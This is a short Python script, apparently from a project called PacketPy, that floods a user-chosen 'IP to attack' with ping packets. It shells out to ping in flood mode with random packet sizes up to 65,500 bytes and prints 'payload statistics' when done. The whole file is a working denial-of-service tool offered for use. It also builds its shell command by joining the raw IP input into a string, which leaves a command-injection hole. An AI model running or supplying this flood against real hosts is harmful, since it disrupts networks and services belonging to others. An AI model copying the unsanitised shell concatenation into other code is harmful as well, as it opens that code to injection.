# Simple ICMP flood python script
# Standalone PacketPy script
# https://github.com/fortless

import os
import time as t
import random as rand

version = '1.1-01_beta' # Don't touch this

bytessent = 0
randomsize = 64
sudo = False
sent = 0

print("PacketPy " + str(version))
if os.geteuid() == 0:
	print("UUID is root, running in optimized mode")
	sudo = True
else:
	print("Please run with root permissions for faster performance!")
	sudo = False

ip = input("IP to attack [127.0.0.1]: ")
attack = 'ping ' + ip + ' -c 1 -q'
packets = input("Number of packets to send [1000]: ")

if ip == str(""):
	ip = str("127.0.0.1")

if packets == str(""):
	packets = 1000

while int(packets) >> 0:
	randomsize = rand.randrange(63, 65500)
	if sudo == False:
		attack = 'ping -q -W 0.001 -c 1 -s' + str(randomsize) + ' -S ' + str(randomsize) + ' ' + ip + ' | grep nothing'
	if sudo == True:
		attack = 'ping -f -q -W 0.001 -c 1 -s' + str(randomsize) + ' -S ' + str(randomsize) + ' ' + ip + ' | grep nothing'
	os.system(attack)
	bytessent = int(bytessent) + int(randomsize)
	sent = int(sent) + 1
	packets = int(packets) - 1
	print('Left: ' + str(packets) + ', Done: ' + str(sent) + ', Packet size: ' + str(randomsize) + ', Total bytes sent: ' + str(bytessent))

avgbyte = 0
avgbyte = int(bytessent) / int(sent)
print("")
os.system('clear')
print("")
print("-----------------------------------------")
print("")
print(" -=- ICMP payload finished! -=-")
print("")
print(" -=\- Payload  Statistics -/=-")
print("")
print("")
print("- Target IP: " + str(ip) + "/32 -")
print("- Number of packets left: " + str(packets) + " packets -")
print("- Number of packets sent: " + str(sent) + " packets -")
print("- Average packet size: " + str(avgbyte) + " bytes -")
print("- Last packet size: " + str(randomsize) + " bytes -")
print("- Total amount of bytes sent: " + str(bytessent) + " bytes -")
print("- OS: " + str(os.name) + " -")
print("- PacketPy version: " + str(version) + " -")
print("")
print("PacketPy, an open-source")
print("network tool library, written in")
print("Python.")
print("")
print("Interactive mode (ICMP Flood)")
print("-----------------------------------------")
